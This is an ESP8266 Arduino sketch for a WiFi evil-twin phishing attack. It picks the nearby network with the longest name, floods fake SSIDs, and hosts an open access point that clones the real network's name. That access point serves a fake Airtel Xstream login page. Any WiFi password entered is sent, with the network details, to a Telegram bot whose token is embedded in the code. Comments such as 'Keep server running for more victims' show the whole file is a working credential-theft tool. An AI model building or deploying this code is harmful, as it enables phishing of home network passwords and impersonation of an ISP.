#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <WiFiManager.h>

// 🔥 FIXED: Telegram Config (REPLACE YOUR VALUES)
const char* TELEGRAM_BOT_TOKEN = "8560004612:AAGG8sNRtXk_vUdTe5lRhT5ndTBAl_JMmhY";  // @BotFather se
const char* TELEGRAM_CHAT_ID = "8560004612";     // getUpdates se

const int LED_PIN = LED_BUILTIN;
const int MAX_FAKE_SSIDS = 40;  // 🔥 FIXED: Typo correction

String targetSSID = "";
String targetBSSID = "";
String capturedPassword = "";
String capturedSSID = "";

// Fake SSID variations (Airtel themed)
String fakeSSIDs[40];

// Web server
ESP8266WebServer server(80);

// 🔥 FIXED: ALL FUNCTION DECLARATIONS ADDED HERE
void sendTelegramMessage(String message);
void blinkLED40Times();
void handleLoginPage();
void handleLoginPost();
void handleCSS();
void handleLogo();
String urlEncode(String str);

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);
  
  EEPROM.begin(512);
  Serial.println("🔥 ESP8266 WiFi Evil Twin Starting...");
  delay(2000);
  
  scanAndSelectTarget();
}

void loop() {
  server.handleClient();
  if (targetSSID.length() > 0) {
    startEvilTwinAttack();
  }
  delay(100);
}

void scanAndSelectTarget() {
  Serial.println("📡 Scanning WiFi networks...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  int networks = WiFi.scanNetworks();
  String biggestSSID = "";
  int maxLength = 0;
  
  Serial.println("Available networks:");
  for (int i = 0; i < networks; i++) {
    String ssid = WiFi.SSID(i);
    int len = ssid.length();
    Serial.printf("  %d: %s (%d chars) RSSI:%d\n", i + 1, ssid.c_str(), len, WiFi.RSSI(i));
    
    if (len > maxLength && len > 5 && !ssid.startsWith("ESP") && !ssid.startsWith("pwned")) {
      maxLength = len;
      biggestSSID = ssid;
      targetBSSID = WiFi.BSSIDstr(i);
    }
  }
  
  if (biggestSSID.length() > 0) {
    targetSSID = biggestSSID;
    Serial.printf("🎯 TARGET: %s (Len:%d) BSSID:%s\n", targetSSID.c_str(), maxLength, targetBSSID.c_str());
    
    generateFakeSSIDs(targetSSID);
    sendTelegramMessage("🎯 TARGET: " + targetSSID + " | BSSID: " + targetBSSID);
  } else {
    Serial.println("❌ No target. Rescan in 30s...");
    delay(30000);
    scanAndSelectTarget();
  }
}

void generateFakeSSIDs(String original) {
  String base = original.substring(0, min(8, (int)original.length()));
  for (int i = 0; i < MAX_FAKE_SSIDS; i++) {
    fakeSSIDs[i] = base + "_" + String(random(1000, 9999));
  }
}

void startEvilTwinAttack() {
  Serial.println("🚀 Starting Evil Twin + Phishing...");
  
  WiFi.mode(WIFI_AP_STA);
  
  // Quick fake SSID flood
  floodFakeNetworks();
  
  // Main phishing AP (original SSID)
  WiFi.softAP(targetSSID.c_str(), "");
  
  Serial.println("📶 Phishing AP: " + targetSSID);
  Serial.println("🌐 Login page: http://" + WiFi.softAPIP().toString());
  
  // 🔥 FIXED: All handlers registered
  server.on("/", handleLoginPage);
  server.on("/login", HTTP_POST, handleLoginPost);
  server.on("/style.css", handleCSS);
  server.on("/airtel.png", handleLogo);
  
  server.begin();
  sendTelegramMessage("🚀 ACTIVE: " + targetSSID + " | Fake Airtel login ready!");
}

void floodFakeNetworks() {
  for (int i = 0; i < MAX_FAKE_SSIDS; i++) {  // 🔥 FIXED: Correct variable name
    WiFi.softAP(fakeSSIDs[i].c_str());
    delay(200);
  }
  WiFi.softAPdisconnect(true);
}

// 🔥 FIXED: Airtel Login Page (Perfect clone)
void handleLoginPage() {
  String html = R"html(
<!DOCTYPE html>
<html>
<head>
    <title>Airtel Xstream Fiber - Login</title>
    <meta name="viewport" content="width=device-width">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="login-box">
        <img src="/airtel.png" class="logo">
        <h2>Airtel Xstream WiFi</h2>
        <form action="/login" method="POST">
            <input type="text" name="ssid" placeholder="WiFi Name" value=)html" + targetSSID + R"html(" readonly>
            <input type="password" name="password" placeholder="Enter WiFi Password" required>
            <button type="submit">Connect Now</button>
        </form>
        <div class="footer">Secure • Airtel Fiber Broadband</div>
    </div>
</body>
</html>)html";
  
  server.send(200, "text/html", html);
}

// 🔥 FIXED: Credential Capture
void handleLoginPost() {
  capturedSSID = server.arg("ssid");
  capturedPassword = server.arg("password");
  
  Serial.printf("🎣 CAPTURED!\nSSID: %s\nPASS: %s\n", capturedSSID.c_str(), capturedPassword.c_str());
  
  String message = "🔥 STEALED!\n📶 SSID: " + capturedSSID + "\n🔑 PASS: " + capturedPassword + "\n📍 BSSID: " + targetBSSID;
  sendTelegramMessage(message);
  
  // Success redirect
  String success = R"html(
<!DOCTYPE html>
<html><head><meta http-equiv="refresh" content="3;url=http://www.airtel.in"></head>
<body style="background:#00a651;color:white;text-align:center;padding:50px">
<h1>✅ Connected Successfully!</h1>
<p>Redirecting to Airtel...</p>
</body></html>)html";
  
  server.send(200, "text/html", success);
  blinkLED40Times();  // Mission complete!
}

void handleCSS() {
  String css = R"css(
body {margin:0;font-family:Arial;background:linear-gradient(135deg,#ff6b35,#f7931e);height:100vh;display:flex;align-items:center;justify-content:center}
.login-box {background:rgba(255,255,255,0.95);padding:40px;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,0.3);text-align:center;max-width:350px}
.logo {width:80px;margin-bottom:20px}
h2 {color:#333;margin:0 0 30px;font-size:24px}
input {width:100%;padding:15px;margin:10px 0;border:none;border-radius:10px;box-sizing:border-box;font-size:16px}
input[readonly] {background:#f0f0f0}
button {width:100%;padding:15px;background:#00a651;color:white;border:none;border-radius:10px;font-size:18px;cursor:pointer}
button:hover {background:#008c44}
.footer {margin-top:20px;color:#666;font-size:12px}
)css";
  server.send(200, "text/css", css);
}

void handleLogo() {
  // Airtel Logo SVG (inline)
  String svg = R"svg(
<svg width="80" height="30" viewBox="0 0 80 30" xmlns="http://www.w3.org/2000/svg">
  <rect width="80" height="30" rx="5" fill="#FF6B35"/>
  <text x="40" y="20" font-family="Arial" font-size="14" font-weight="bold" fill="white" text-anchor="middle">AIRTEL</text>
</svg>)svg";
  server.send(200, "image/svg+xml", svg);
}

// 🔥 FIXED: Telegram Function
void sendTelegramMessage(String message) {
  if (WiFi.status() == WL_CONNECTED) {
    WiFiClientSecure client;
    HTTPClient http;
    
    http.begin(client, "https://api.telegram.org/bot" + String(TELEGRAM_BOT_TOKEN) + 
               "/sendMessage?chat_id=" + String(TELEGRAM_CHAT_ID) + "&text=" + urlEncode(message));
    http.addHeader("Content-Type", "application/x-www-form-urlencoded");
    int httpCode = http.POST("");
    
    if (httpCode > 0) {
      Serial.println("✅ Telegram sent!");
    }
    http.end();
  }
}

// 🔥 FIXED: LED Blink 40 times
void blinkLED40Times() {
  Serial.println("✅ 40 BLINKS - MISSION COMPLETE!");
  sendTelegramMessage("✅ COMPLETE! 40 blinks done.");
  
  for (int i = 0; i < 40; i++) {
    digitalWrite(LED_PIN, LOW);  // ON
    delay(150);
    digitalWrite(LED_PIN, HIGH); // OFF
    delay(150);
  }
  
  // Keep server running for more victims
  while(1) {
    server.handleClient();
    delay(100);
  }
}

// 🔥 FIXED: URL Encode Function
String urlEncode(String str) {
  String encoded = "";
  for (unsigned int i = 0; i < str.length(); i++) {
    char c = str.charAt(i);
    if (isAlphaNumeric(c)) {
      encoded += c;
    } else if (c == ' ') {
      encoded += '+';
    } else {
      encoded += '%' + String(c >> 4, HEX) + String(c & 0xF, HEX);
    }
  }
  return encoded;
}
